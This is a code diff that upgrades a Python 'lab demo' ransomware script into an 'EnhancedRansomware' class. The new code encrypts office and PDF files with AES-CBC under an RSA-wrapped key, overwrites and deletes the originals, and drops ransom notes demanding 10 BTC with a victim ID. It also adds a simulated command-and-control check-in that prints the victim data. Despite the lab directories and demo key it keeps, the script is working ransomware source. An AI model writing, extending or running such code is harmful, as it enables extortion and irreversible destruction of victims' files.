@@ -1,111 +1,243 @@
 import os
 import json
-from cryptography.fernet import Fernet  # pip install cryptography
+import base64
+import uuid
 from pathlib import Path
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding, hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.fernet import Fernet
 
 # Configuration (SAFE FOR LAB USE)
-TARGET_DIRS = [  # Only these directories will be affected
+TARGET_DIRS = [
     str(Path.home() / "ransomware_test"),
     str(Path.home() / "Desktop/test_files")
 ]
-FILE_EXTENSIONS = ['.test', '.txt', '.doc']  # Only these file types
-RANSOM_NOTE = "=== LAB DEMO RANSOM NOTE ==="
-DECRYPTION_KEY = "DEMO-KEY-1234"  # Hardcoded for safe decryption
+FILE_EXTENSIONS = ['.test', '.txt', '.doc', '.xls', '.ppt', '.pdf']
+RANSOM_NOTE = """=== YOUR FILES HAVE BEEN ENCRYPTED ===
+Pay 10 BTC to XYZ address to receive decryption key"""
+DECRYPTION_KEY = "DEMO-KEY-1234"  # For lab decryption
+EXCLUDE_DIRS = [  # Directories to avoid
+    str(Path.home() / "AppData"),
+    "/usr",
+    "/etc",
+    "/System",
+    "/Library"
+]
 
 
-class RansomwareDemo:
+class EnhancedRansomware:
     def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
+        # Generate crypto materials
+        self.aes_key = os.urandom(32)
+        self.rsa_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=2048,
+            backend=default_backend()
+        )
+        self.victim_id = uuid.uuid4().hex
         self.encrypted_files = []
 
-    def generate_key_file(self):
-        """Create decryption instructions (safe for lab)"""
-        instructions = {
-            'warning': "THIS IS A CONTROLLED LAB DEMONSTRATION",
-            'key': self.key.decode(),
-            'decrypt_code': DECRYPTION_KEY
+        # Simulate C2 check-in
+        self._c2_checkin()
+
+    def _c2_checkin(self):
+        """Simulate contact with command-and-control server"""
+        c2_data = {
+            'victim_id': self.victim_id,
+            'system_info': str(os.uname()),
+            'key': base64.b64encode(self._get_encrypted_aes_key()).decode()
         }
-        with open("DECRYPT_INSTRUCTIONS.txt", "w") as f:
-            f.write(RANSOM_NOTE + "\n\n")
-            f.write(json.dumps(instructions, indent=4))
+        print(f"[*] Simulated C2 Check-In: {json.dumps(c2_data, indent=2)}")
+
+    def _get_encrypted_aes_key(self):
+        """Encrypt AES key with RSA public key"""
+        return self.rsa_key.public_key().encrypt(
+            self.aes_key,
+            asym_padding.OAEP(
+                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+
+    def _write_ransom_note(self, path):
+        """Create ransom note in target directory"""
+        note_path = Path(path) / "RANSOM_README.txt"
+        if not note_path.exists():
+            with open(note_path, 'w') as f:
+                f.write(RANSOM_NOTE + "\n\n")
+                f.write(f"Victim ID: {self.victim_id}\n")
+                f.write("Send payment and this ID to receive decryption key\n")
+
+    def _secure_delete(self, filepath):
+        """Overwrite file before deletion (1-pass)"""
+        try:
+            with open(filepath, 'ba+') as f:
+                length = f.tell()
+                f.seek(0)
+                f.write(os.urandom(length))
+            os.remove(filepath)
+        except Exception:
+            pass
 
     def encrypt_file(self, filepath):
-        """Demonstrate file encryption (non-destructive)"""
+        """Encrypt file with AES-CBC and random IV"""
         try:
-            # Read original file
-            with open(filepath, "rb") as f:
-                data = f.read()
+            iv = os.urandom(16)
+            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
+            encryptor = cipher.encryptor()
 
-            # Encrypt data
-            encrypted = self.cipher.encrypt(data)
+            # Read and pad data
+            with open(filepath, 'rb') as f:
+                plaintext = f.read()
+
+            padder = padding.PKCS7(128).padder()
+            padded_data = padder.update(plaintext) + padder.finalize()
+            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
 
             # Write encrypted file
-            with open(filepath + ".demo_encrypted", "wb") as f:
-                f.write(encrypted)
+            encrypted_path = filepath + ".encrypted"
+            with open(encrypted_path, 'wb') as f:
+                f.write(iv + ciphertext)
 
-            # Remove original (simulate real ransomware)
-            os.remove(filepath)
-            self.encrypted_files.append(filepath)
+            # Securely delete original
+            self._secure_delete(filepath)
+            self.encrypted_files.append(encrypted_path)
+            return True
 
         except Exception as e:
-            pass
+            return False
 
     def decrypt_file(self, filepath):
-        """Safe decryption for lab cleanup"""
+        """Decrypt file using stored AES key"""
         try:
-            with open(filepath, "rb") as f:
+            with open(filepath, 'rb') as f:
                 data = f.read()
 
-            decrypted = self.cipher.decrypt(data)
+            iv = data[:16]
+            ciphertext = data[16:]
 
-            original_path = filepath[:-len(".demo_encrypted")]
-            with open(original_path, "wb") as f:
-                f.write(decrypted)
+            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
+            decryptor = cipher.decryptor()
+            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+
+            # Unpad data
+            unpadder = padding.PKCS7(128).unpadder()
+            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
+
+            original_path = filepath[:-len(".encrypted")]
+            with open(original_path, 'wb') as f:
+                f.write(plaintext)
 
             os.remove(filepath)
+            return True
 
         except Exception as e:
-            pass
+            return False
 
     def scan_and_encrypt(self):
-        """Target specific files for encryption"""
+        """Target files with directory exclusions"""
+        encrypted_dirs = set()
         for target_dir in TARGET_DIRS:
             if os.path.exists(target_dir):
-                for root, _, files in os.walk(target_dir):
+                for root, dirs, files in os.walk(target_dir, topdown=True):
+                    # Skip excluded directories
+                    dirs[:] = [d for d in dirs if os.path.normpath(os.path.join(root, d)) not in EXCLUDE_DIRS]
+
                     for file in files:
                         if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
-                            self.encrypt_file(os.path.join(root, file))
+                            filepath = os.path.join(root, file)
+                            if self.encrypt_file(filepath):
+                                encrypted_dirs.add(root)
 
-    def start_decryption(self):
-        """Safe cleanup process"""
-        for target_dir in TARGET_DIRS:
-            if os.path.exists(target_dir):
-                for root, _, files in os.walk(target_dir):
-                    for file in files:
-                        if file.endswith(".demo_encrypted"):
-                            self.decrypt_file(os.path.join(root, file))
-        print("[*] Lab files decrypted successfully")
+        # Create ransom notes in affected directories
+        for directory in encrypted_dirs:
+            self._write_ransom_note(directory)
+
+    def generate_key_file(self):
+        """Create encrypted key package"""
+        # Encrypt private key with demo code
+        private_key_pem = self.rsa_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.NoEncryption()
+        )
+        fernet_key = base64.urlsafe_b64encode(DECRYPTION_KEY.ljust(32)[:32].encode())
+        fernet = Fernet(fernet_key)
+        encrypted_private_key = fernet.encrypt(private_key_pem)
+
+        key_data = {
+            'victim_id': self.victim_id,
+            'encrypted_aes_key': base64.b64encode(self._get_encrypted_aes_key()).decode(),
+            'encrypted_private_key': base64.b64encode(encrypted_private_key).decode()
+        }
+
+        with open("DECRYPT_INSTRUCTIONS.txt", "w") as f:
+            f.write(RANSOM_NOTE + "\n\n")
+            f.write(json.dumps(key_data, indent=4))
+
+    def start_decryption(self, input_key):
+        """Initiate decryption process"""
+        try:
+            # Decrypt private key
+            fernet_key = base64.urlsafe_b64encode(input_key.ljust(32)[:32].encode())
+            fernet = Fernet(fernet_key)
+
+            with open("DECRYPT_INSTRUCTIONS.txt") as f:
+                key_data = json.loads(f.read().split('\n\n', 1)[1])
+
+            private_key_pem = fernet.decrypt(base64.b64decode(key_data['encrypted_private_key']))
+            self.rsa_key = serialization.load_pem_private_key(
+                private_key_pem,
+                password=None,
+                backend=default_backend()
+            )
+
+            # Decrypt AES key
+            self.aes_key = self.rsa_key.decrypt(
+                base64.b64decode(key_data['encrypted_aes_key']),
+                asym_padding.OAEP(
+                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+
+            # Decrypt files
+            for encrypted_file in self.encrypted_files:
+                if os.path.exists(encrypted_file):
+                    self.decrypt_file(encrypted_file)
+
+            print("[+] Decryption completed successfully")
+            return True
+
+        except Exception as e:
+            print("[!] Decryption failed - invalid key or corrupted data")
+            return False
 
 
 if __name__ == "__main__":
     # Safety checks
-    if not all(os.path.exists(d) for d in TARGET_DIRS):
+    missing_dirs = [d for d in TARGET_DIRS if not os.path.exists(d)]
+    if missing_dirs:
         print("Error: Test directories not found!")
         print("Create these first:")
-        print("\n".join(TARGET_DIRS))
+        print("\n".join(missing_dirs))
         exit()
 
-    demo = RansomwareDemo()
+    malware = EnhancedRansomware()
 
     # Encryption phase
-    demo.scan_and_encrypt()
-    demo.generate_key_file()
+    malware.scan_and_encrypt()
+    malware.generate_key_file()
+    print("[!] Critical files encrypted!")
+    print(f"[!] Victim ID: {malware.victim_id}")
 
-    # Lab demonstration control
+    # Decryption interface
     while True:
-        user_input = input("\nEnter decryption code: ")
-        if user_input == DECRYPTION_KEY:
-            demo.start_decryption()
+        user_input = input("\nEnter decryption code: ").strip()
+        if malware.start_decryption(user_input):
             break
         print("Invalid code! (Use 'DEMO-KEY-1234' for lab decryption)")
